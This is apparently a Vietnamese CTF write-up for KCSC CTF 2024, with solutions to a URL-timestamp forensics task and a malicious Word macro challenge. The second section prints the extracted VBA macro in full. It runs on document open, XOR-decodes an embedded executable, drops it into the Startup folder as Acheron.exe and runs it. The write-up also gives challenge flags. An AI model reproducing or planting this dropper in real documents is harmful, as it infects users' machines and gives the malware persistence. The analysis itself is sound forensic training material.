Hello cả nhà, đợt vừa rồi mình được 1 anh trai siêu tốt bụng cho mượn nick để chơi KCSC CTF 2024, nên hôm nay mình muốn viết writeup tất cả những bài mình giải được
và đây là năm đầu tiên mình có cơ hội tham gia giải CTF của trường mà mình đã trượt NV1 😔😔. Thui hong buồn nữa, bắt đầu nè!!!

### Externet Inplorer

Bài cho chúng ta 1 đường link và yêu cầu chúng ta tìm timestamp của nó khi được search. Challenge này khá là dễ, các bạn chỉ cần sử dụng [tool](https://dfir.blog/unfurl/) là ra nha :3 

**KCSC{2023-09-18_08:32:22.547027}**

### Jumper In Disguise

Sample của chúng ta là 1 file .docm và chúng ta phải điều tra xem nó có thực sự độc hại hay không. Với những bài dạng kiểu này, mình luôn để ý đến VBA code - những dòng code phụ trách 
việc thực thi các tác vụ tự động, và kẻ xấu có thể chỉnh sửa đoạn code này cho mục đích xấu

Đầu tiên, mình sử dụng **olevba.py** để extract toàn bộ VBA code:
<details>
<summary>
	The decompiled output
</summary>
```
  Function zzz(troll As String) As String
    Dim aaa As String
    Dim bbb As String
    Dim ccc As String
    Dim i As Integer
    aaa = ""
    For i = 1 To Len(troll) Step 2
        aaa = aaa & ChrW("&H" & Mid(troll, i, 2))
    Next i
    bbb = "4444"
    ccc = ""
    For i = 1 To Len(aaa)
        ccc = ccc & ChrW(AscW(Mid(aaa, i, 1)) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1)))
    Next i
    
    zzz = ccc
End Function
Sub AutoOpen()
    MsgBox "YOU GOT BONKED"
    MsgBox "KCSC{Keep_findin_till_reveal_secret}"
    Dim troll As String
    Dim nifal As String
    troll = "7a4a5c4245565a1742525a435058461b11405b5844575c421140525c4440565911595a5c5a5c46161012"
    nifal = zzz(troll)


Dim luachua
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
luachua = FreeFile
Open (ActiveDocument.FullName) For Binary As #luachua
Dim lem() As Byte
ReDim lem(file_length)
Get #luachua, 1, lem
Dim eee As String
eee = StrConv(lem, vbUnicode)
Dim fff, rrr
Dim nbv
    Set nbv = CreateObject("vbscript.regexp")
    nbv.Pattern = "SUPERNOVAOVERLOAD"
    Set rrr = nbv.Execute(eee)
Dim idx

For Each fff In rrr
idx = fff.FirstIndex
Exit For
Next

En = Environ("appdata") & "\Microsoft\Windows\Start Menu\Programs\Startup"
Set fszzzzz = CreateObject("Scripting.FileSystemObject")
Dim wakuwaku() As Byte
Dim soj As Long
soj = 4296810
ReDim wakuwaku(soj)
Get #luachua, idx + 18, wakuwaku
Dim bruh
bruh = FreeFile
deced = wakuwaku

Dim mei() As Byte
mei = deced
bbb = "4444"
For i = 1 To (soj + 1)
    jdj = deced(i - 1) Xor AscW(Mid(bbb, (i - 1) Mod Len(bbb) + 1, 1))
    mei(i - 1) = jdj
    Next i

namae = En & "\" & "Acheron.exe"
Open (namae) For Binary As #bruh
Put #bruh, 1, mei

Close #bruh
Erase wakuwaku
Set ceo = CreateObject("WScript.Shell")
ceo.Run """" + namae + """" + nifal
ActiveDocument.Save
End Sub
```
</details>
